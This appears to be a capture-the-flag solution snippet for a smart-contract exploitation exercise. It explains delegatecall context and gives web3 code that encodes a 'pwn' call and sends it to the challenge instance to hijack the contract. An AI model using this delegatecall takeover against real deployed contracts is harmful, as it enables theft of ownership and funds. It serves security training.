`delegatecall` will evaluate the call in the context of the contract that makes the call.

```
const data = web3.eth.abi.encodeFunctionCall({
    name: 'pwn',
    type: 'function',
    inputs: []
}, []);

sendTransaction({ from: player, to: instance, data })
```
